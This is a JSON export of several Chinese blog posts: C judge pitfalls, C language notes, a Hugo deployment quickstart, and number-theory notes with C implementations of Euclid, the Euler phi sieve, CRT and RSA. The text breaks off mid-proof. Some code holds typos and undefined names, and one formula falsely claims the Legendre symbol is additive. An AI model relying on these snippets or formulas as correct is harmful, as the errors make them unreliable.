[{"content":"主要给出了WA时可能会出现的错误, 节省调试时间, 并方便日后回顾; 建议提交一次后对照查询, 其他问题请本地调试解决.\n001 略.\n002 略.\n003 使用CHAR_MAX等宏时, 注意包含头文件\u0026lt;limits.h\u0026gt;.\n004 求平均数时, 注意直接相加可能会越界.\n1 int avg = ((a-b)\u0026gt;\u0026gt;1)+b; 005 输出大写十六进制需使用\u0026quot;%X\u0026quot;, \u0026ldquo;%x\u0026quot;会输出小写十六进制.\n006 略.\n007 使用\u0026quot;tmp/10\u0026quot;做十进制向右移位获取输入数字长度.\n1 2 3 4 5 tmp = n; while(tmp){ tmp /= 10; ++k; } 008 C中三角函数仅接收弧度参数, 需先将经纬度转换为弧度.\n1 2 #define Pi 3.1415926 phi1 = phi1*PI/180; 009 注意输出要求四舍五入, 只做类型转换是截断.\n1 int chillInt = (int) (chillDouble+0.5f); 010 提交未过(WA/CE). 本地测试均能通过.\n","date":"2023-09-19T00:00:00Z","permalink":"https://example.com/p/nojc%E6%98%93%E9%94%99%E6%80%BB%E7%BB%93/","title":"NOJ(C)易错总结"},{"content":"标准默认C11, 编译器默认GCC8.1.0及MSVC1937. 内容不分先后顺序, 请按需查阅.\nCMAKE 使用CLion或VS时, 可以考虑如下CMAKE配置; 会自动获取项目名与文件名, 每次修改项目名文件名或新建文件时, 只需重新加载CMAKE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 cmake_minimum_required(VERSION 3.26) get_filename_component(ProjectId ${CMAKE_CURRENT_SOURCE_DIR} NAME) string(REPLACE \u0026#34; \u0026#34; \u0026#34;_\u0026#34; ProjectId ${ProjectId}) project(${ProjectId} C) set(CMAKE_C_STANDARD 11) file(GLOB files \u0026#34;${CMAKE_CURRENT_SOURCE_DIR}/*.c\u0026#34;) foreach(file ${files}) get_filename_component(name ${file} NAME) add_executable(${name} ${file}) endforeach() 添加头文件:\n1 include_directories(\u0026#34;头文件相对路径\u0026#34;) 此外, 还可以修改C标准版本:\n1 set(CMAKE_C_STANDARD 99) 一个方便调试的头文件 该头文件中定义用变长参数定义了一系列输出函数, 可以直接采用\u0026quot;PRINT_TYPE(variable);\u0026ldquo;的形式来打印对应类型的变量并换行. 传入数组时, 传入的是数组的首位指针, 还需在外部获取数组长度一并传入.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #ifndef BASICC_IO_UTILS_IO_UTILS_H_ #define BASICC_IO_UTILS_IO_UTILS_H_ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; void PrintBinary(unsigned int value); //#define PRINT_METADATA #ifdef PRINT_METADATA # define PRINTLNF(format, ...) printf(\u0026#34;(\u0026#34;__FILE__\u0026#34;:%d) %s: \u0026#34;format\u0026#34;\\n\u0026#34;, __LINE__, __FUNCTION__ , ##__VA_ARGS__) #else # define PRINTLNF(format, ...) printf(format\u0026#34;\\n\u0026#34;, ##__VA_ARGS__) #endif #define PRINT_CHAR(char_value) PRINTLNF(#char_value\u0026#34;: %c\u0026#34;, char_value) #define PRINT_WCHAR(char_value) PRINTLNF(#char_value\u0026#34;: %lc\u0026#34;, char_value) #define PRINT_INT(int_value) PRINTLNF(#int_value\u0026#34;: %d\u0026#34;, int_value) #define PRINT_LONG(long_value) PRINTLNF(#long_value\u0026#34;: %ld\u0026#34;, long_value) #define PRINT_LLONG(long_value) PRINTLNF(#long_value\u0026#34;: %lld\u0026#34;, long_value) #define PRINT_BINARY(int_value) PrintBinary((unsigned int) int_value); #define PRINT_HEX(int_value) PRINTLNF(#int_value\u0026#34;: %#x\u0026#34;, int_value) #define PRINT_BOOL(bool_value) PRINTLNF(#bool_value\u0026#34;: %s\u0026#34;, bool_value ? \u0026#34;true\u0026#34; : \u0026#34;false\u0026#34;) #define PRINT_DOUBLE(double_value) PRINTLNF(#double_value\u0026#34;: %g\u0026#34;, double_value) #define PRINT_STRING(string_value) PRINTLNF(#string_value\u0026#34;: %s\u0026#34;, string_value) #define PRINT_ARRAY(format, array, length) \\ { int array_index; \\ for (array_index = 0; array_index \u0026lt; length; ++array_index) { \\ printf(format, array[array_index]); \\ };\\ printf(\u0026#34;\\n\u0026#34;); } #define PRINT_INT_ARRAY_LN(array, length) \\ { int i; \\ for (i = 0; i \u0026lt; length; ++i) { \\ PRINTLNF(#array\u0026#34;[%d]: %d\u0026#34;, i, array[i]); \\ }} #define PRINT_INT_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%d, \u0026#34;, array, length) #define PRINT_CHAR_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%c, \u0026#34;, array, length) #define PRINT_DOUBLE_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%g, \u0026#34;, array, length) #endif //BASICC_IO_UTILS_IO_UTILS_H_ 来自: https://www.bennyhuo.com/\n赋值语句 在赋值语句中, 左值(\u0026quot;=\u0026ldquo;左边)必须是一个变量或说内存, 不能为数值; 右值(\u0026quot;=\u0026ldquo;右边)一定为数值.\n1 2 3 4 5 int *p = \u0026amp;a; *p = 2; // 合法 *(p+1) = 3; // 合法 \u0026amp;a = p; // 非法, \u0026amp;a为变量a的地址, 是数值 *p+1 = 4; // 非法, *p解引用, *p+1为p指向的内存中的数据+1, 是数值 1 2 3 4 5 int array[] = {0,1,2,3}; int *p = array; *p = 10; // 合法 *p++ = 20; // 合法 *++p = 30; // 合法 不同数据类型的运算 整型提升: 表达式中存在(unsigned) int, 则 (unsigned) char, (unsigned) short int, enum 均转换为int, 不足时转换为 unsigned int.\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int main(){ char ch = \u0026#39;a\u0026#39;; short st = 4; int i = 0; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ch+st),sizeof(i)); return 0; } 隐式转换: 算术表达式: 低类型转换为高类型, int -\u0026gt; unsigned int -\u0026gt; long -\u0026gt; unsigned long -\u0026gt; long long -\u0026gt; unsigned long long -\u0026gt; float -\u0026gt; double -\u0026gt; long double; 赋值表达式: 右值转换为左值; 函数传参: 实参转换为形参; 函数返回值: 表达式转换为返回值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;stdio.h\u0026gt; int main(){ int i = 0; unsigned int ui = 0; long l = 1; long long ll = 2; float f = 0.1f; double d = 0.2f; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(i+l),sizeof(l)); printf(\u0026#34;%llu %llu %llu \\n\u0026#34;,sizeof(l+ll),sizeof(ui+ll),sizeof(ll)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ll*f),sizeof(f)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(f+d),sizeof(d)); short s = d*ll; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(s)); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; double func(int a){ printf(\u0026#34;%llu\\n\u0026#34;,sizeof(a)); return a; } int main(){ double a = 2.9f; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(func(a))); printf(\u0026#34;%f\u0026#34;, func(a)); return 0; } 强制类型转换: (类型名) 表达式\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 17, b = 5; double c = a/b; double d = (double)a/b; printf(\u0026#34;%f %f\u0026#34;,c,d); return 0; } 应用: 模平方时防止越界\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 104560; int m = 1307; int b = (a*a)%m; int c = (1LL*a*a)%m; int d = ((long long)a*a)%m; printf(\u0026#34;%d %d %d\u0026#34;,b,c,d); return 0; } 内存对齐 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; char ch; int i; short s; double d; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); printf(\u0026#34;%llu\\n\u0026#34;, sizeof(ch)+ sizeof(ch)+ sizeof(i)+ sizeof(s)+ sizeof(d)); return 0; } 发现结构体内部变量占用空间加起来仅为16个字节, 但结构体占用24个字节, 这就涉及到结构体的内存对齐.\nchar占用1字节, 对齐到1的倍数; int占用4字节, 对齐到4的倍数; double占用8字节, 对齐到8的倍数. 尽管内存以字节为基本单位, 但CPU会以4字节, 8字节, 甚至16字节进行访问; 在没有对齐机制时, 访问到正确的变量位置需要额外操作. 内存对齐系数由编译器决定, 结构体占用内存为对齐系数倍数. GCC和MSVC中默认对齐系数均为4, 可以通过预编译\u0026rdquo;#pragma pack(n)\u0026ldquo;来改变.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #pragma pack(2) int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 但通常不建议改变对齐系数, 为了使结构体占用更小内存, 应当将占用较小的变量统一排在前面, 如将上述结构体修改为:\n1 2 3 4 5 6 7 8 9 10 11 int main(){ typedef struct { char sch1; char sch2; short ss; int si; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 动态数组 有时在声明数组时无法确定数组长度, 需要传入参数.\n1 2 3 4 5 6 7 #include \u0026lt;stdio.h\u0026gt; int main(){ int n = 3; int a[n]; return 0; } GCC可以编译通过; 但MSVC不支持变长数组, 会报错. 可以考虑用内存分配函数实现, 调用方式同数组.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main(){ int n = 3; int *a = (int*)malloc(n*sizeof(int)); a[0] = 1; printf(\u0026#34;%d\u0026#34;,a[0]); free(a); a = NULL; return 0; } 深入理解指针 声明变量时, 如\u0026quot;int a;\u0026rdquo;, 在运行时会为变量a开辟一块内存空间, 但值不能确定. 用scanf写入时, 用\u0026rdquo;\u0026amp;a\u0026quot;表示写入到变量a所在的地址. 地址的数据类型即为指针类型, 即指针类型的变量存放的数据为内存地址.\n数据类型包含两个信息: 内存占用大小; 读写时遵循的规则. 定义一个指针类型时, 还需要给出指向的数据类型. 这是因为指针仅指向一个内存单元, 也就是CPU读写的起始位置(小端序下的数据低位); 只有给出指向的数据类型, CPU才能知道读写的终止位置和读写遵循的规则.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ long long a = 0x0A0B0C0D; long long* p1 = \u0026amp;a; int* p2 = \u0026amp;a; // 在本行打断点调试, 在CLion或VS的Memory View中输入\u0026amp;a查看内存位置, 并对比Threads \u0026amp; Variables中p1,p2的值 return 0; } 此外, 指针类型的占用空间取决于CPU寻址方式, 与指向的数据类型无关.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main(){ char a; short b; int c; double d; char *pa = \u0026amp;a; short *pb = \u0026amp;b; int *pc = \u0026amp;c; double *pd = \u0026amp;d; printf(\u0026#34;%llu %llu %llu %llu\u0026#34;,sizeof(pa),sizeof(pb),sizeof(pc),sizeof(pd)); return 0; } 无歧义地, 指针类型和指针类型变量均简称为指针.\n1 2 3 4 // 指针存放的是地址, 以下显然是合法的. int a; int *p = \u0026amp;a; scanf(\u0026#34;%d\u0026#34;,p); 显然\u0026quot;int **p\u0026quot;意为指向\u0026quot;int *\u0026ldquo;类型的指针, \u0026ldquo;int ***p\u0026quot;意为指向\u0026quot;int **\u0026ldquo;类型的指针. \u0026ldquo;*p\u0026quot;含义为解引用, 即读写指针p指向的内存.\n在使用指针时, 应当避免出现野指针, 即指向非法内存的指针.\n1 2 3 // 使用未初始化的指针 int *p; printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 // 释放指针后未置空 int *p = (int*)malloc(sizeof(int)); free(p); printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 5 6 7 8 9 // 指向对象已消亡(超出变量作用域) int *Address(void){ int a = 10; return \u0026amp;a; } void getAddress(void){ int *p = Address(); printf(\u0026#34;%d\u0026#34;,*p); } 1 2 3 4 5 // 指针赋值为无法读取的内存 int *p = (int *) 0x100000; printf(\u0026#34;%d\u0026#34;,*p); // Windows进程内存空间地址从0x400000开始 // 但考虑到平台不同时进程起始位置不同, 通常不建议赋值为具体地址 指针也可以进行加减运算, 含义为指向前后的内存, 移动单位取决于指向的数据类型.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main(){ double a = 0.0f; double *p = \u0026amp;a; printf(\u0026#34;%u %u %u %llu\u0026#34;,p-1,p,p+1,sizeof(a)); return 0; } 数组是连续的内存, 由此想到可以通过数组指针来调用数组, 同时数组变量名本质上也是指针.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ int array[] = {0,1,2,3}; int *p = array; printf(\u0026#34;%d %d %d %d %d\u0026#34;,array[2],p[2],*(p+2),*(array+2),2[array]); return 0; } // 考虑到可读性, 仅推荐array[2]和p[2]两种调用方式. 指针自然也可以作为函数参数. 调用函数赋值时, 如\u0026quot;int a = func(b);\u0026rdquo;, CPU将函数返回值复制到寄存器中, 再将寄存器中的数据复制到要改变的变量, 这一过程也就体现为变量的作用域. C可以返回结构体, 同时无法直接返回数组, 不使用指针时可以将数组包含在结构体中; 而若直接返回结构体, 结构体由于本身占用较大, 复制两次导致性能开销过大. 此时, 可以在函数外声明结构体或数组, 并将指向结构体的指针或数组传入.\n函数也存在地址, 自然也可以有指向函数的指针. 但声明函数指针时, 运算优先级问题往往让人感到困惑: 如参数列表\u0026rdquo;()\u0026ldquo;的优先级高于\u0026rdquo;*\u0026rdquo;. 在分析函数声明时, 可以借助网站: https://cdecl.org/.\n待更新内容: 聚合体与字节序, 逻辑短路, 内存泄漏, 副作用, 按位运算妙用, 宏函数, 变长参数, 线程\n","date":"2023-09-16T00:00:00Z","permalink":"https://example.com/p/c%E6%9D%82%E8%B0%88/","title":"C杂谈"},{"content":"PREPARATION git download hugo download Check git \u0026amp; hugo added in the environment variables (Windows).\nThe following steps are in Bash.\n1 2 git version hugo version ON PREMISES 1 2 3 4 5 6 hugo new site blog cd blog git clone https://themeName themes/themeName cp themes/themeName/exampleSite/* ./ -r rm hugo.toml hugo server FIRST COMMIT Github Create Repositoriy: username.github.io\n1 2 3 4 5 6 7 hugo cd public git init git remote add origin https://github.com/username/username.github.io.git git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master LATER COMMIT 1 2 3 4 5 6 hugo cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push KATEX CONFUSION display obsidian hugo newline \\\\ \\\\\\ % \\% \\\\% suffix { }_ { }\\_ * * \\* ","date":"2023-09-14T00:00:00Z","permalink":"https://example.com/p/hugo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"hugo快速入门"},{"content":"文中所有C代码均编译通过并得到正确结果! (C11 - GCC8.1.0)\n整除 性质: $c|a$, $c|b \\Longrightarrow$ $c|ax+by$, $\\forall x,y\\in\\mathbb{Z}$. 最大公因数: ${\\rm gcd}(a,b)=\\inf_{\\geq 0}{sa+tb|s,t\\in\\mathbb{Z}}$.\n辗转相除求${\\rm gcd}$: $$\\begin{align} \u0026amp;a=q_1b+r_1\\\\ \u0026amp;b=q_2r_1+r_2\\\\ \u0026amp;\u0026hellip;\\\\ \u0026amp;r_{n-2}=q_nr_{n-1}+r_n \\end{align}$$ 当 $r_n=0$ 时, 有 $r_{n-1}={\\rm gcd}(a,b)$.\n对序列中被除数与除数从$1$开始编号, 进而有递归: $$\\begin{align} \u0026amp;a_i=(a_i/b_i)b_i+(a_i\\%b_i)\\\\ \u0026amp;a_i=b_{i-1}\\\\ \u0026amp;b_i=a_{i-1}\\%b_{i-1} \\end{align}$$ 并约定 ${\\rm gcd}(a,0)=a$.\n1 2 3 int Euclid(int a, int b){ return b==0? a : Euclid(b,a%b); } Bezout定理: 给定 $a,b\\in\\mathbb{Z}$, Diophantine方程 $ax+by=m$ 有解 $\\Longleftrightarrow$ ${\\rm gcd}(a,b)|m$.\n可仅考查 $m={\\rm gcd}(a,b)$, 不然, 结果只需乘相应倍数. 在递归中, 显然有 ${\\rm gcd}(a,b)={\\rm gcd}(a_i,b_i)$, 即 $\\exists x_i,y_i\\in\\mathbb{Z}$ s.t. $a_ix_i+b_iy_i=m$. $$\\begin{align} m\u0026amp;=a_ix_i+b_iy_i\\\\ \u0026amp;=b_{i-1}x_i+(a_{i-1}\\%b_{i-1})y_i\\\\ \u0026amp;=b_{i-1}x_i+[a_{i-1}-(a_{i-1}/b_{i-1})b_{i-1}]y_i\\\\ \u0026amp;=y_ia_{i-1}+[x_i-(a_{i-1}/b_{i-1})y_i]b_{i-1}\\\\ \u0026amp;=x_{i-1}a_{i-1}+y_{i-1}b_{i-1} \\end{align}$$\n1 2 3 4 5 6 7 8 9 10 11 12 13 int extEuclid(int a, int b, int* x, int* y){ if (b==0){ *x = 1; *y = 0; return a; } else { int tempX,tempY; int gcd = extEuclid(b,a%b,\u0026amp;tempX,\u0026amp;tempY); *y = tempX-(a/b)*tempY; *x = tempY; return gcd; } } 而使用CPP元组写法上更优雅些:\n1 2 3 4 5 6 7 8 9 tuple\u0026lt;int,int,int\u0026gt;extEuclidCpp(int a, int b){ if (b==0){ return make_tuple(a,1,0); } else { int x,y,gcd; tie(x,y,gcd) = extEuclidCpp(b,a%b); return make_tuple(gcd,y,x-(a/b)*y); } } 定理: 素数i $p$ 及 $a,b\\in\\mathbb{Z}$, 若 $p|ab$ 则 $p|a$ 或 $p|b$.\n设 $p\\nmid a$ 且 $p\\nmid b$, 则 $\\exists x,y$ s.t. $xp+ya=1$, 故 $x(ab)+(by)p=b$, 有 $p|b$, 矛盾.\n唯一分解: $\\forall n\\in\\mathbb{Z}$, $n=\\prod p_i^{k_i}$, $p_i$ 为不同素数, $k_i\\in\\mathbb{Z}_+$, 形式唯一.\n同余 性质: $\\forall m\\in\\mathbb{Z}_+$, $a\\equiv b({\\rm mod}\\ m) \\Longleftrightarrow m|a-b$.\n$a\\equiv b({\\rm mod}\\ m)$, $c\\equiv d({\\rm mod}\\ m) \\Longrightarrow a+c\\equiv b+d({\\rm mod}\\ m)$, $ac\\equiv bd({\\rm mod}\\ m)$, $a^n\\equiv b^n({\\rm mod}\\ m)$. $ak\\equiv bk({\\rm mod}\\ m) \\Longrightarrow a\\equiv b({\\rm mod}\\ \\frac{m}{{\\rm gcd}(m,k)})$. 模 $m$ 剩余类: $\\mathbb{Z}/m\\mathbb{Z}$. 最小非负完全剩余系: $\\mathbb{Z}_m={0,1\u0026hellip;,m-1}$, 显然 $\\forall x\\neq y\\in\\mathbb{Z}_m$ s.t. $x\\not\\equiv y({\\rm mod}\\ m)$. 既约剩余系: $\\mathbb{Z}_m^*={a\\in\\mathbb{Z}_m|{\\rm gcd}(a,m)=1}$.\nEuler $\\varphi$ 函数: $$m=\\prod_{i=1}^r p_i^{k_i}, |\\mathbb{Z}_m^*|=\\varphi(m)=\\prod_{i=1}^r p_i^{k_i-1}(p_i-1)=m\\prod_{p|m}(1-\\frac{1}{p})$$\n当 $m=p$ 为素数时, 有 $\\varphi(p)=p-1$; $\\mathbb{Z}_p^*={1,2,\u0026hellip;,p-1}$ 为循环群, 生成元个数为$\\varphi(p-1)$.\n考察函数性质:\n若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // O(n), 每个数均只遍历一次 void phiEulerLinerSieve(int n){ int phi[n+1], prime[n+1]; bool isSieved[n+1]; int count = 1; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[count++] = i; phi[i] = i-1; } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ int composite = i*prime[j]; isSieved[composite] = 1; if (i%prime[j] == 0){ phi[composite] = primep[j]*phi[i]; break; } else { phi[composite] = (prime[j]-1)*phi[i]; } } } } 定理: 若 ${\\rm \\gcd}(a,m)=1$, $x$ 遍历 $\\mathbb{Z}_m^*$, 则 $ax$ 也遍历$\\mathbb{Z}_m^*$.\n考虑 ${\\rm gcd}(ax,m)=1$ 及 $ax_i\\not\\equiv ax_j({\\rm mod}\\ m)$, $i\\neq j$.\n逆元: 若 ${\\rm gcd}(a,m)=1$, 则 $\\exists ! x\\in\\mathbb{Z}_m^*$ s.t. $ax\\equiv 1({\\rm mod}\\ m)$. Euler: 若 ${\\rm gcd}(a,m)=1$, 则 $a^{\\varphi(m)}\\equiv 1({\\rm mod}\\ m)$.\n$\\mathbb{Z}_m^*={x_1,\u0026hellip;,x_{\\varphi(m)}}={ax_1,\u0026hellip;,a_{\\varphi(m)}}$, 故 $\\prod x_i\\equiv\\prod ax_i({\\rm mod}\\ m)$, 已知 ${\\rm gcd}(x_i,m)=1$, 得 $m|a^{\\varphi(m)}-1$.\n特别 $m=p$ 为素数时, Fermat: 若 $p\\nmid a$, 则 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 有 $a^{-1}\\equiv a^{p-2}({\\rm mod}\\ p)$. 由扩展Euclid, ${\\rm gcd}(a,m)=1$, $\\exists s,t\\in\\mathbb{Z}$ s.t. $as+tm=1$, 即 $a^{-1}\\equiv s({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 int inverseExtEuclid(int a, int m){ int s,t; int gcd = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (gcd == 1){ return s; } else { return 0; } } wilson: 素数 $p$ 有 $(p-1)!\\equiv -1({\\rm mod}\\ p)$.\n$\\mathbb{Z}_m^*$ 中元素均存在逆, 自逆仅 $1,p-1$; ${2,3,\u0026hellip;,p-2}$ 中两两配对互逆.\n1 2 3 4 5 6 7 bool wilson(int p){ int factMod = 1; for (int i = p-1; i \u0026gt;= 1; --i){ factMod = (factMod*i)%p; } return (factMod+1)%p == 0; } 仿射: ${\\rm gcd}(a,26)=1$, 密钥对数量 $26\\varphi(26)-1=311$.\n加密 $c=E_{a,b}(m)=am+b({\\rm mod}\\ 26)$. 解密 $m=D_{a,b}(c)=a^{-1}(c-b)({\\rm mod}\\ 26)$. 同余式 同余式 $f(x)\\equiv a_nx^n+\u0026hellip;+a_1x+a_0({\\rm mod}\\ m)$, $a_i\\in\\mathbb{z}$, $m\\in\\mathbb{Z}_+$. 同余方程 $f(x)\\equiv 0({\\rm mod}\\ m)$ 至多有 $m$ 个解(剩余类).\n一次同余 $ax\\equiv b({\\rm mod}\\ m)$, $a,b\\in\\mathbb{Z}$, $m\\in\\mathbb{Z}_+$ 有解 $\\iff {\\rm gcd}(a,m)|b$.\n$ax\\equiv b({\\rm mod}\\ m)$ 在 ${\\rm gcd}(a,m)=1$ 时有唯一解 $x\\equiv a^{-1}b({\\rm mod}\\ m)$. 记 $d={\\rm gcd}(a,m)$, 有 $\\frac{a}{d}x\\equiv \\frac{b}{d}({\\rm mod}\\ \\frac{m}{d})$, 即 $x=\\frac{b}{d}(\\frac{a}{d})^{-1}+k\\frac{m}{d}$, $k\\in\\mathbb{Z}$. 考虑 $k=qd+r$, $q,r\\in\\mathbb{Z}$, $0\\leq r\u0026lt; d$, $x=[\\frac{b}{d}(\\frac{a}{d})^{-1}({\\rm mod}\\frac{m}{d})+r\\frac{m}{d}]({\\rm mod\\ m})$.\n求解步骤:\n扩展Euclid求 $d={\\rm gcd}(a,m)$, 记 $sa+tm=d$; $b\\%d=0$ 判断有无解; 设 $b\u0026rsquo;=b/d$, $m\u0026rsquo;=m/d$, $s\u0026rsquo;\\equiv s({\\rm mod}\\ m\u0026rsquo;)$; 得 $x\\equiv s\u0026rsquo;b\u0026rsquo;+rm\u0026rsquo;\\ ({\\rm mod}\\ m)$, $r=0,1,\u0026hellip;,d-1$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int linearCongEq (int a, int b, int m, int ansX[]){ a %= m; b %= m; int s,t; int origM = m; int d = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (b%d == 0){ b /= d; m /= d; s %= m; for (int r = 0; r \u0026lt;= d-1; ++r){ ansX[r] = ((s*b+r*m)%(origM)+origM)%origM; } return d; } else { return 0; } } 一次同余组(CRT): $m_{i{1\\leq i \\leq k}}$ 两两互素, 同余组 $x\\equiv a_i({\\rm mod\\ m_i})_{{1\\leq i\\leq k}}$ 有唯一解 $x=\\sum M_i M_i^{-1} a_i \\ ({\\rm mod}\\ m)$. 其中, $m=\\prod m_i$, $M_i=m/m_i$, $M_i^{-1}$ 为模 $m_i$ 上的逆.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 long crt (int a[],int m[],int n){ int modSepM[n]; int modIevM[n]; long modM[n]; long prodM = 1; long x = 0; for (int i = 0; i \u0026lt; n; ++i){ prodM *= m[i]*1L; } for (int i = 0; i \u0026lt; n; ++i){ modM[i] = 1L*prodM/m[i]; modSepM[i] = (1L*modM[i])%m[i]; modIevM[i] = inverseExtEuclid(modSepM[i],m[i]); if (!modIevM[i]){ return 0; } } for (int i = 0; i \u0026lt; n; ++i) { x = (x+1L*modIevM[i]*modM[i]*a[i])%prodM; } x = (x+prodM)%prodM; return x; } RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$.\n公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)\\equiv c^d({\\rm mod}\\ n)$. 快速模幂 $r\\equiv t^e({\\rm mod}\\ n)$ 1 2 3 4 5 6 7 8 9 10 11 int fastPowerMod (int t, int ex, int n){ int r = 1; while (ex){ if (ex\u0026amp;1){ r = (1LL*r*t)%modular; } t = (1LL*t*t)%modular; ex \u0026gt;\u0026gt;= 1; } return r; } 二次剩余 $ax^2+bx+c\\equiv 0({\\rm mod}\\ m)$ 总能简化为 $x^2\\equiv d({\\rm mod}\\ q^k)$, $q$ 为素数, $a,b,c,d,m,k\\in\\mathbb{Z}_+$. 仅考虑 $x^2\\equiv a({\\rm mod}\\ q)$, ${\\rm gcd}(a,p)=1$, $a\\in\\mathbb{Z}$ 为模素数 $q$ 的二次剩余.\nEuler: ${\\rm gcd}(a,p)=1$, $p$ 为奇素数, $a\\in\\mathbb{Z}$:\n模 $p$ 的二次剩余恰有 $\\frac{p-1}{2}$ 个. $a$ 为模 $p$ 二次剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$, 此时 $x^2\\equiv a({\\rm mod}\\ p)$ 有二解. $a$ 为模 $p$ 二次非剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv -1({\\rm mod}\\ p)$. 显然 $i^2\\equiv(p-i)^2({\\rm mod}\\ p)$; 若 $j^2\\equiv i^2({\\rm mod}\\ p)$, $1\\leq i\u0026lt;j\u0026lt;\\frac{p}{2}$, 则 $p|j-i$ 或 $p|j+i$, 但 $j+i\u0026lt;p$, 矛盾.\n$a$ 为模 $p$ 二次剩余时, $\\exists x_0\\in\\mathbb{Z}$, ${\\rm gcd}(x_0,p)=1$, $x_0^2\\equiv a({\\rm mod}\\ p)$, 故 $a^{\\frac{p-1}{2}}\\equiv x_0^{p-1}\\equiv 1({\\rm mod}\\ p)$.\n$a$ 为模 $p$ 二次非剩余时, 考虑 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 则 $p|{\\frac{p-1}{2}}-1$ 或 $p|{\\frac{p-1}{2}}+1$, 但 $x^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$ 的全部解恰为全部的二次剩余.\nLegendre: $(\\frac{a}{p})=a^{\\frac{p-1}{2}}\\%p=1\\ {\\rm or}\\ -1\\ {\\rm or}\\ 0$, $p$ 为素数, $a\\in\\mathbb{Z}$.\n$$ (\\frac{1}{p}) = 1;\\ (\\frac{ab}{p})=(\\frac{a}{p})(\\frac{b}{p}); \\ (\\frac{a+b}{p})=(\\frac{a}{p})+(\\frac{b}{p})$$\n$$(\\frac{a^2}{p})=1,\\ {\\rm gcd}(a,p)=1$$\n$$ (\\frac{-1}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%4=1\\\\ \u0026amp;-1,\\ \u0026amp;p\\%4=3 \\end{cases}$$\n$$ (\\frac{2}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%8=1,7\\\\ \u0026amp;-1,\\ \u0026amp;p\\%8=3,5 \\end{cases}$$\n二次互反: $(\\frac{p}{q})(\\frac{q}{p})=(-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}$, $p\\ne q$ 为奇素数.\nGuass: 奇素数 $p$, $a\\in\\mathbb{Z}$, ${\\rm gcd}(a,p)=1$, 设 $M_{a,p}={ka\\%p, \\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\ |\\ ka\\%p\u0026gt;\\frac{p}{2}}$, 记 $m(a,p)=|M_{a,p}|$, 则 $(\\frac{a}{p})=(-1)^{m(a,p)}$.\n设 $K={ka\\%p\\ |\\ k=1,2,\u0026hellip;,\\frac{p-1}{2}}$, $b_i\\in M$, $c_j\\in M-K$, $i=1,2,..,m(a,p)$, 